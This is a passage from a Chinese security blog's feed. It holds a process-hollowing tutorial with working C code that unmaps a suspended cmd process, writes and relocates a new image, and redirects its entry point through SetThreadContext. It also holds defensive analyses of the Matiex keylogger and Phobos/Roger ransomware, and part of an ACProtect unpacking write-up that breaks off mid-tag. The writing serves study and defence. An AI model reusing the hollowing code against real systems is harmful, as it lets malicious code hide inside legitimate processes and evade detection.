PIMAGE_SECTION_HEADER Sections;    ULONG                 Characteristics;    BOOLEAN               fSystemImage;    BOOLEAN               fDOSImage;    BOOLEAN               fReadOnly;    UCHAR                 Version;    LIST_ENTRY            Links;    ULONG                 SizeOfImage;&#125; LOADED_IMAGE, *PLOADED_IMAGE;</code></pre><p>紧接着进行相关节的取消映射，方便之后对该节进行相关写入操作。</p><pre><code>    printf(&quot;Unmapping destination section\r\n&quot;);    HMODULE hNTDLL = GetModuleHandleA(&quot;ntdll&quot;);    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, &quot;NtUnmapViewOfSection&quot;);    _NtUnmapViewOfSection NtUnmapViewOfSection =        (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;    DWORD dwResult = NtUnmapViewOfSection    (        pProcessInfo-&gt;hProcess,         pPEB-&gt;ImageBaseAddress    );    if (dwResult)    &#123;        printf(&quot;Error unmapping section\r\n&quot;);        return;    &#125;</code></pre><p>接着通过VirtualAllocEx在cmd进程中分配内存，内存的起始地址有第二个参数决定，这样就完成了相关内存的分配过程。</p><pre><code>pRemoteImage = VirtualAllocEx //如果errorcode=487 则可能是本程序编译选项/DYNAMICBASE未设置为NO    (        pProcessInfo-&gt;hProcess,        pPEB-&gt;ImageBaseAddress,        pSourceHeaders-&gt;OptionalHeader.SizeOfImage,        MEM_COMMIT | MEM_RESERVE,        PAGE_EXECUTE_READWRITE    );    if (!pRemoteImage)    &#123;        printf(&quot;VirtualAllocEx call failed error=%d\r\n&quot;,GetLastError());        return;    &#125;    DWORD dwDelta = (DWORD)pPEB-&gt;ImageBaseAddress -        pSourceHeaders-&gt;OptionalHeader.ImageBase;    printf    (        &quot;Source image base: 0x%p\r\n&quot;        &quot;Destination image base: 0x%p\r\n&quot;,        pSourceHeaders-&gt;OptionalHeader.ImageBase,        pPEB-&gt;ImageBaseAddress    );</code></pre><p>由于复制的内容大同小异，这里针对.reloc也就是重定位节进行一个重点讲述，也是本次内容中最重要的部分。</p><pre><code>if (dwDelta)        for (DWORD x = 0; x &lt; pSourceImage-&gt;NumberOfSections; x++)        &#123;            char* pSectionName = &quot;.reloc&quot;;                    if (memcmp(pSourceImage-&gt;Sections[x].Name, pSectionName, strlen(pSectionName)))                continue;            printf(&quot;Rebasing image\r\n&quot;);            DWORD dwRelocAddr = pSourceImage-&gt;Sections[x].PointerToRawData;            DWORD dwOffset = 0;            IMAGE_DATA_DIRECTORY relocData =                 pSourceHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];            while (dwOffset &lt; relocData.Size)            &#123;                PBASE_RELOCATION_BLOCK pBlockheader =                     (PBASE_RELOCATION_BLOCK)&amp;pBuffer[dwRelocAddr + dwOffset];                dwOffset += sizeof(BASE_RELOCATION_BLOCK);                DWORD dwEntryCount = CountRelocationEntries(pBlockheader-&gt;BlockSize);                //                PBASE_RELOCATION_ENTRY pBlocks =                     (PBASE_RELOCATION_ENTRY)&amp;pBuffer[dwRelocAddr + dwOffset];                for (DWORD y = 0; y &lt;  dwEntryCount; y++)                &#123;                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);                    if (pBlocks[y].Type !=3)                        continue;                    DWORD dwFieldAddress =                         pBlockheader-&gt;PageAddress + pBlocks[y].Offset;                    DWORD dwBuffer = 0;                    ReadProcessMemory                    (                        pProcessInfo-&gt;hProcess,                         (PVOID)((DWORD)pPEB-&gt;ImageBaseAddress + dwFieldAddress),                        &amp;dwBuffer,                        sizeof(DWORD),                        0                    );                    //printf(&quot;Relocating 0x%p -&gt; 0x%p\r\n&quot;, dwBuffer, dwBuffer - dwDelta);                    dwBuffer += dwDelta;                    BOOL bSuccess = WriteProcessMemory                    (                        pProcessInfo-&gt;hProcess,                        (PVOID)((DWORD)pPEB-&gt;ImageBaseAddress + dwFieldAddress),                        &amp;dwBuffer,                        sizeof(DWORD),                        0                    );                    printf(&quot;NewRelocaAddress=0x%x -&gt; Newvalue=0x%x\r\n&quot;, dwFieldAddress,dwBuffer);                    num++;                    if (!bSuccess)                    &#123;                        printf(&quot;Error writing memory\r\n&quot;);                        continue;                    &#125;                &#125;            &#125;            break;        &#125;    printf(&quot;total write %d relocationtable\r\n&quot;,num);</code></pre><p>DataDirectory是一个结构体数组，结构体由VirtualAddress和Size组成。</p><pre><code>typedef struct _IMAGE_DATA_DIRECTORY &#123;    DWORD   VirtualAddress;    DWORD   Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</code></pre><p>数组包含以下15种，这里用到的就是IMAGE_DIRECTORY_ENTRY_BASERELOC，即重定位表。</p><pre><code>#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor</code></pre><p>其中CountRelocationEntries是一个宏，用于计算重定位的个数。</p><pre><code>#define CountRelocationEntries(dwBlockSize)        \    (dwBlockSize -                                \    sizeof(BASE_RELOCATION_BLOCK)) /            \    sizeof(BASE_RELOCATION_ENTRY)</code></pre><p>除此之外PBASE_RELOCATION_ENTRY结构如下所示，前12位表示偏移量，后4位表示类型。</p><pre><code>typedef struct BASE_RELOCATION_ENTRY &#123;    USHORT Offset : 12;    USHORT Type : 4;&#125; BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;</code></pre><p>接下来的部分会涉及到线程执行劫持，利用OpenThread打开目标线程，在获取目标线程的句柄后，恶意软件通过调用SuspendThread来将线程置于挂起模式。调用VirtualAllocEx和WriteProcessMemory来分配内存并执行代码注入的操作。然后调用GetThreadContext和GetThreadContext获取并设置线程的上下文，以将EIP寄存器设置到要执行恶意代码的地址，达到重启线程的作用。。</p><pre><code>涉及的相关API函数使用顺序OpenThreadSuspendThreadVirtualAllocExWriteProcessMemoryGetThreadContextSetThreadContextResumeThread</code></pre><p>注意的是pContext-&gt;Eax = dwEntrypoint;利用某个寄存器来完成入口点的赋值，利用SetThreadContext完成上下文设置，最后通过ResumeThread执行，代码如下所示。</p><pre><code>printf(&quot;total write %d relocationtable\r\n&quot;,num);        DWORD dwEntrypoint = (DWORD)pPEB-&gt;ImageBaseAddress +            pSourceHeaders-&gt;OptionalHeader.AddressOfEntryPoint;        printf(&quot;EntryPoint=0x%p\r\n&quot;, dwEntrypoint);#ifdef WRITE_BP        printf(&quot;Writing breakpoint\r\n&quot;);        DWORD dwBreakpoint = 0xCC;        if (!WriteProcessMemory            (            pProcessInfo-&gt;hProcess,             (PVOID)dwEntrypoint,             &amp;dwBreakpoint,             4,             0            ))        &#123;            printf(&quot;Error writing breakpoint\r\n&quot;);            return;        &#125;#endif        pContext = new CONTEXT();        pContext-&gt;ContextFlags = CONTEXT_INTEGER;        printf(&quot;Getting thread context\r\n&quot;);        if (!GetThreadContext(pProcessInfo-&gt;hThread, pContext))        &#123;            printf(&quot;Error getting context\r\n&quot;);            return;        &#125;        pContext-&gt;Eax = dwEntrypoint;                    printf(&quot;Setting thread context\r\n&quot;);        if (!SetThreadContext(pProcessInfo-&gt;hThread, pContext))        &#123;            printf(&quot;Error setting context\r\n&quot;);            return;        &#125;        printf(&quot;Resuming thread\r\n&quot;);        if (!ResumeThread(pProcessInfo-&gt;hThread))        &#123;            printf(&quot;Error resuming thread\r\n&quot;);            return;        &#125;        printf(&quot;Process hollowing complete\r\n&quot;);&#125;</code></pre><p>自此，整个代码流程就讲解完成如有什么疑问，可自行查询相关资料或者留言告知我。</p><h3 id="HelloWorld演示"><a href="#HelloWorld演示" class="headerlink" title="HelloWorld演示"></a>HelloWorld演示</h3><p>接下来进行调试演示，通过调试发现Creating process的进程是cmd，并且为Suspended，符合之前的描述过程。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF.png"></p><p>获取到cmd相关结构信息。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84%E4%BF%A1%E6%81%AF.png"></p><p>获取重定位的目标差。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%AE%A1%E7%AE%97.png"></p><p>由于HelloWorld.exe本身没有重定位表，所以调试的时候一直没有进入相关函数。</p><h3 id="DLL调试"><a href="#DLL调试" class="headerlink" title="DLL调试"></a>DLL调试</h3><p>这里自己创建一个dll来替代HelloWorld。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/DLL%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81.png"></p><p>通过调试发现dwEntryCount值为136，目前还没有搞明白是什么意思。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/dwEntryCount.png"></p><p>最后通过打印，发现一共找到了148个重定位函数，有些不可思议。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E9%87%8D%E5%AE%9A%E4%BD%8D%E5%87%BD%E6%95%B0.png"></p><p>借助studype来看一下重定位表的情况，0x88+0xE=0x96=226，比输出的148大，通过内容发现有些是00，所以我选择相信有148个需要重定位的函数。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E6%9F%A5%E7%9C%8B.png"></p><p>新的程序入口点为0xABB829A即将赋值给eax+0xb0这里。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E8%8E%B7%E5%8F%96%E5%85%A5%E5%8F%A3%E7%82%B9%E4%BF%A1%E6%81%AF.png"></p><p>通过另一个调试器附件进程，如果附加失败则在CreateProcess之后就附加即可。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95.png"></p><p>成功弹出MessageBox，整体调试完毕。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E6%88%90%E5%8A%9F%E5%BC%B9%E6%A1%86.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;2021年第一篇技术分析文章，有不足之处还请大家多多包涵。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过对API的调用，实现文件不落地的一种技术。需要编译选项/DYNAMICBASE or /FIXED 其中一个为NO 目的是取消生成重定位表，这里已/DYNAMIC</summary>
      
    
    
    
    <category term="进程相关技术" scheme="http://risks255.github.io/categories/%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="进程替换" scheme="http://risks255.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2/"/>
    
    <category term="process hollowing" scheme="http://risks255.github.io/tags/process-hollowing/"/>
    
  </entry>
  
  <entry>
    <title>第一篇博文</title>
    <link href="http://risks255.github.io/2020/12/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87/"/>
    <id>http://risks255.github.io/2020/12/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87/</id>
    <published>2020-12-21T09:49:02.000Z</published>
    <updated>2021-01-31T03:31:38.391Z</updated>
    
    <content type="html"><![CDATA[<p>作为博客的第一篇内容，感谢这一路以来给给予我帮助的朋友。</p><p>终于还是赶上了2020的末班车，从此踏上写Blog的旅程，并坚持自己的初心。</p><p>今天是2020年的冬至节，这里祝大家冬至安康。</p><p>希望能在2020的末尾，完成自己的新计划。</p><p>2021就要到了，愿新的一年可以收获属于自己的成长。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作为博客的第一篇内容，感谢这一路以来给给予我帮助的朋友。&lt;/p&gt;
&lt;p&gt;终于还是赶上了2020的末班车，从此踏上写Blog的旅程，并坚持自己的初心。&lt;/p&gt;
&lt;p&gt;今天是2020年的冬至节，这里祝大家冬至安康。&lt;/p&gt;
&lt;p&gt;希望能在2020的末尾，完成自己的新计划。&lt;/p</summary>
      
    
    
    
    <category term="随笔" scheme="http://risks255.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="生活" scheme="http://risks255.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>某Matiex分析</title>
    <link href="http://risks255.github.io/2020/09/25/%E6%9F%90Matiex%E5%88%86%E6%9E%90/"/>
    <id>http://risks255.github.io/2020/09/25/%E6%9F%90Matiex%E5%88%86%E6%9E%90/</id>
    <published>2020-09-25T07:56:00.000Z</published>
    <updated>2021-02-03T11:50:18.991Z</updated>
    
    <content type="html"><![CDATA[<p><strong>原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。</strong></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>​Matiex是一款功能完整的键盘记录器，除此之外还包含屏幕截图，用户信息收集等多样性功能，以盗取用户账号和密码为目的。</p><h2 id="二、样本信息"><a href="#二、样本信息" class="headerlink" title="二、样本信息"></a>二、样本信息</h2><p>MD5: 80ca7c023f86983b45096df0433a8966</p><p>SHA1: 6333e753ee7549a668b7f048646244b4151a802f</p><p>SHA256: 99a9f37b29dd440c803ea37c57a6acded495d4b49c165f66b3fbe8a427972799</p><p>CRC32: a6d3c3ea</p><h2 id="三、样本分析"><a href="#三、样本分析" class="headerlink" title="三、样本分析"></a>三、样本分析</h2><p>​先使用exeinfo查看文件是否加壳，发现是个C#编写的程序。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image002.jpg"></p><p>​C#先准备分析工具Dnspy，github中可直接下载，这一步相对简单。</p><p>​在资源中发现了一张png，但是却无法看到png的图形内容，看似可疑后续应该会进行数据读取操作。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image004.jpg"></p><p>​加载资源段中的png图片，为之后解密该数据做准备。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image006.jpg"></p><p>​png数据已被解密成一个PE文件，dump内存数据。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image008.jpg"></p><p>​同样使用exeinfo查看信息，同样为C#程序。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image010.jpg"></p><p>​同样发现含有一个资源段，只不过没有显示出数据内容，大小440832字节，差不多430kb左右大小。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image012.jpg"></p><p>​但是类命名被混淆，发现依旧存在加载资源段中的数据的操作。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image014.jpg"></p><p>​使用循环异或操作来解密被加密的资源数据。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image016.jpg"></p><p>​双击pass即可看到内置的pass内容，用于解密的key。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image018.jpg"></p><p>​解密后得到第二个PE文件，dump提取出来。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image020.jpg"></p><p>​这应该就是为什么被命名为Matiex的原因吧，Main函数逻辑代码基本被Matiex替换。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image022.jpg"></p><p>接着就需要借助de4dot来进行解混淆操作了，直接将需要解混淆的文件作为参数即可。一键式傻瓜化操作，对刚接触这个软件的新手来说，非常的好用。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image024.jpg"></p><p>​解混淆之后，代码可读性更高，更容易理解。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image026.jpg"></p><h2 id="四、Matiex键盘记录器"><a href="#四、Matiex键盘记录器" class="headerlink" title="四、Matiex键盘记录器"></a>四、Matiex键盘记录器</h2><p>​大部分功能在main中可以直接找到，不过main函数所在的模块被混淆为UnkownModule，主要功能有剪切板数据记录，截屏操作和键盘记录，并且每间隔10分钟启动一次。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image028.jpg"></p><p>​除此之外还有一些数据收集操作，以下列举了部分。</p><p><img src="/img/%E6%9F%90Matiex%E5%88%86%E6%9E%90/clip_image030.jpg"></p><h2 id="五、建议"><a href="#五、建议" class="headerlink" title="五、建议"></a>五、建议</h2><p>由于Matiex是被打包放置在压缩文件中，因此传播方式很可能利用邮件方式传播，多进行安全意识培训，提高对陌生邮件的防范意识显得尤为重要。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;​</summary>
      
    
    
    
    <category term="Csharp" scheme="http://risks255.github.io/categories/Csharp/"/>
    
    
    <category term="Matiex分析" scheme="http://risks255.github.io/tags/Matiex%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Phobos勒索软件变种之Roger来袭</title>
    <link href="http://risks255.github.io/2020/09/17/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/"/>
    <id>http://risks255.github.io/2020/09/17/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/</id>
    <published>2020-09-17T01:35:00.000Z</published>
    <updated>2021-02-03T11:47:25.258Z</updated>
    
    <content type="html"><![CDATA[<p><strong>一、背景</strong></p><p>​    Roger是近期较为活跃的一款勒索病毒，通常通过RDP暴力破解+人工投放的方式进行攻击，攻击者成功入侵后，通常会关闭系统的安全软件防护功能，运行勒索病毒，加密后会修改文件后缀为[原文件名]+id[随机字符串]+[邮箱地址].ROGER，目前该勒索无法解密。</p><p>行为概述</p><p>​    勒索病毒运行后，创建互斥体，接着遍历数据库，邮件，办公软件等相关进程，并中止查询到的进程，解除文件占用，以保证加密文件成功。之后运行加密模块。与此同时，内存解密出勒索信息、需要加密文件后缀名、以及被加密文件随机后缀等。之后遍历系统文件目录，加密相关文件，最后弹出勒索信息。</p><p>值得关注的是，该勒索病毒在运行过程中会进行自复制，并在注册表添加自启动项，如果没有清除干净系统中残留的病毒体，重启后很可能会遭遇二次加密。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image002.jpg"></p><p>Roger执行流程图</p><p><strong>二、样本分析</strong></p><p>​    首先是有一层upx的外壳，用upx提供的脱壳工具来搞定。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image004.jpg"></p><p>​    紧接着获取VirtualAlloc的地址，用于分配新的内存来存储内部数据。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image006.jpg"></p><p>​    分配0x33000大小的内存，用于之后的解码操作，并执行相应的代码。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image008.jpg"></p><p>​    紧接着对该内存区域进行内存拷贝，拷贝的数据来源于内部数据解码之后的结果。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image010.jpg"></p><p>​    通过EnumSystemGeoID的系统API触发了CreateProcessW，当返回到用户层时，发现已经进入了分配的内存区域。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image012.jpg"></p><p>​    通过SetThreadContext来设置线程的EIP，此时EIP被设置为0x40A9D0。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image014.jpg"></p><p>​    通过附件的方式，附加创建的子进程roger，并跳转到0x40A9D0设置断点信息。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image016.jpg"></p><p>​    加密的文件类型几乎是全文件加密，由于特别多这里只列举了部分。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image018.jpg"></p><p>​    涉及的部分服务信息，多数为数据库相关服务，包括firebird、sql、mssql以及sqlserver。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image020.jpg"></p><p>​    涉及关闭的进程信息，如下图所示，主要包含数据库进程，以mysql、postgres和sqlserver为主。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image022.jpg"></p><p>​    通过进程内存替换完成了一下这些功能，包含目标进程和服务名以及实现多种方式的开机启动，最后删除掉系统的shadow，防止数据恢复。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image024.jpg"></p><p>发现roger设置了很多的开启启动情况，详细如下图所示。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image026.jpg"></p><p>​    首先是注册表的自启动，自启动的目录为SOFTWARE\Microsoft\Windows\CurrentVersion\Run，其中又包含了HKEY_LOCAL_MACHINE和HKEY_CURRENT_USER，这里可以借助Autoruns来帮助完成查找。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image028.jpg"></p><p>接着是通过Start up目录实现开机文件自启动，这里可以借助everything来帮助寻找。</p><p><img src="/img/Phobos%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%8F%98%E7%A7%8D%E4%B9%8BRoger%E6%9D%A5%E8%A2%AD/clip_image030.jpg"></p><p><strong>3**</strong>、安全解决方案：**</p><p>迪普科技安全研究院提醒广大用户：针对已经出现勒索现象的用户，由于暂时没有解密工具，建议尽快对感染主机进行断网隔离。</p><p>1、由于Phobos家族会利用RDP（远程桌面协议），建议关闭3389等远RDP相关端口，如果确实有工作业务需要，建议进行白名单配置，只允许白名单内的IP连接登陆。</p><p>2、尽量关闭不必要的文件共享，或使用强密码对文件共享加密保护。</p><p>3、定期更换帐户密码，采用高强度的密码，避免使用弱口令密码，同时避免使用统一的密码。</p><p>4、对重要文件和数据进行定期异地备份。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;一、背景&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​    Roger是近期较为活跃的一款勒索病毒，通常通过RDP暴力破解+人工投放的方式进行攻击，攻击者成功入侵后，通常会关闭系统的安全软件防护功能，运行勒索病毒，加密后会修改文件后缀为[原文件名]+id[随机字符串</summary>
      
    
    
    
    <category term="样本相关" scheme="http://risks255.github.io/categories/%E6%A0%B7%E6%9C%AC%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="Roger" scheme="http://risks255.github.io/tags/Roger/"/>
    
  </entry>
  
  <entry>
    <title>加密壳之ACProtect系列通杀</title>
    <link href="http://risks255.github.io/2020/08/28/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/"/>
    <id>http://risks255.github.io/2020/08/28/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/</id>
    <published>2020-08-28T08:32:00.000Z</published>
    <updated>2021-02-03T11:48:15.549Z</updated>
    
    <content type="html"><![CDATA[<p><strong>原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。</strong></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在经过几天的研究和之前脱壳学习的积淀，终于是把ACProtect系列的脱壳方法和IAT修复部分给搞定了，趁着研究有些成果，将整个脱壳和IAT修复过程做个记录，整理整理就有了本文的诞生。</p><p><strong>ACProtect是个很老的加密壳了，现在也已经挂掉不再更新了，更多的是做研究脱壳的一个基础，经过深入研究和学习，让我对加壳概念有了更深入的理解，欢迎各位大佬一起讨论脱壳手法。</strong></p><p>值得额外提一点的是，ACProtect是Delphi编写的，经过测试发现对Delphi程序的支持是最好的，其他语言编写的程序经过ACProtect加壳后可能导致程序本身异常退出，这可能也是ACProtect没落的原因之一吧。</p><p>有网络喷子可能会喷，ACProtect系列的脱壳机也有了，为啥还要研究啊？如果只是过来扯淡的，请绕道，我只是做脱壳研究，并不想扯皮。别人的东西始终是别人的，只有自己的东西才是自己的，好好体会这句话你就知道了。</p><h2 id="两次断点法"><a href="#两次断点法" class="headerlink" title="两次断点法"></a>两次断点法</h2><p>首先来看一下原始delphi程序的oep情况。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image002.jpg"></p><p>接下来将一下两次断点法，也被称为内存断点。其原理是利用内存断点修改对应内存的访问权限，当程序执行的时候，由于内存的访问权限问题而出发异常被调试器捕获进而成功中断在对应的内存区域，这是我自己对内存断点的看法，欢迎大家讨论研究。</p><p>现在脱壳开始，第一次内存断点一般选择rsrc或者idata段，可以使用快捷键f2设置内存断点，然后shift+F9让程序执行起来。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image004.jpg"></p><p>当内存断点出发后，程序停留的位置如下所示。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image006.jpg"></p><p>紧接着在code段设置第二个内存断点，同样的shift+f9执行。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image008.jpg"></p><p>接下来就是见证奇迹的时刻了~(bgm响起)</p><p>对比之前原始的oep发现好像少了一部分，原来是存在stolen code。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image010.jpg"></p><p>暂时先不管被偷取的oep，使用importrec先来看看IAT的情况，发现有很多无效，看样子应该是IAT被加密处理了。</p><p><img 